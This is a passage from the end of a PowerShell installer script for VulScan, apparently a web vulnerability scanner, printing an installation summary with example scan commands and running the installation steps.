    Write-Host ""
    
    Write-Host "📁 $(Get-String 'InstallDetails')" -ForegroundColor $Script:Config.Colors.Info
    Write-Host "   • Executable: " -NoNewline -ForegroundColor Gray
    Write-Host $Script:InstallationPaths.ExecutablePath -ForegroundColor $Script:Config.Colors.Success
    Write-Host "   • Configuration: " -NoNewline -ForegroundColor Gray
    Write-Host $Script:InstallationPaths.ConfigDir -ForegroundColor $Script:Config.Colors.Success
    Write-Host "   • Payloads: " -NoNewline -ForegroundColor Gray
    Write-Host $Script:InstallationPaths.PayloadsDir -ForegroundColor $Script:Config.Colors.Success
    Write-Host ""
    
    Write-Host "🚀 $(Get-String 'GettingStarted')" -ForegroundColor $Script:Config.Colors.Info
    Write-Host "   • Command Line: " -NoNewline -ForegroundColor Gray
    Write-Host "vulscan --help" -ForegroundColor $Script:Config.Colors.Progress
    Write-Host "   • PowerShell: " -NoNewline -ForegroundColor Gray
    Write-Host "Import-Module '$($Script:InstallationPaths.InstallDir)\PowerShell\VulScan.psm1'" -ForegroundColor $Script:Config.Colors.Progress
    Write-Host "   • Start Menu: " -NoNewline -ForegroundColor Gray
    Write-Host "Search for 'VulScan'" -ForegroundColor $Script:Config.Colors.Progress
    Write-Host ""
    
    Write-Host "📖 $(Get-String 'ExampleUsage')" -ForegroundColor $Script:Config.Colors.Info
    Write-Host "   vulscan -u https://example.com" -ForegroundColor $Script:Config.Colors.Progress
    Write-Host "   vulscan -u https://example.com --sql --xss" -ForegroundColor $Script:Config.Colors.Progress
    Write-Host "   vulscan -f urls.txt --output report.json" -ForegroundColor $Script:Config.Colors.Progress
    Write-Host ""
    
    Write-Host "🔧 $(Get-String 'ConfigFile') " -NoNewline -ForegroundColor $Script:Config.Colors.Info
    Write-Host (Join-Path $Script:InstallationPaths.ConfigDir "config.yaml") -ForegroundColor $Script:Config.Colors.Progress
    Write-Host ""
    
    Write-Host "$(Get-String 'ThankYou') 🎯" -ForegroundColor $Script:Config.Colors.Success
    Write-Host ""
    Write-Host ("═" * 70) -ForegroundColor $Script:Config.Colors.Header
}

# Main installation function
function Start-Installation {
    try {
        # Language selection first
        $selectedLanguage = Select-Language
        Write-Log "Selected language: $selectedLanguage" -Level Info
        
        Show-Header
        
        # System checks
        Test-SystemRequirements
        Install-Go
        
        # Version selection and installation
        $selectedVersion = Select-Version
        Write-Log "Selected version: $selectedVersion" -Level Info
        
        Install-VulScan -SelectedVersion $selectedVersion
        Install-Files
        New-ConfigurationFiles
        Update-PathVariable
        New-Shortcuts
        New-Uninstaller
        
        # Cleanup and summary
        Remove-TempFiles
        Show-InstallationSummary
        
        Write-Log "Installation completed successfully" -Level Success
    }
    catch {
        Write-Log "Installation failed: $($_.Exception.Message)" -Level Error
        
        if (-not $Silent) {
            Write-Host ""
            Write-Host "❌ Installation failed!" -ForegroundColor Red
            Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host ""
            Write-Host "Check the log file for more details: $($Script:Config.LogFile)" -ForegroundColor Yellow
            Write-Host ""
            Write-Host "For support, visit: https://github.com/ATOMGAMERAGA/VulScan/issues" -ForegroundColor Cyan
        }
        
        # Cleanup on failure
        Remove-TempFiles
        exit 1
    }
}

# Entry point
if ($MyInvocation.InvocationName -ne '.') {
    Start-Installation
}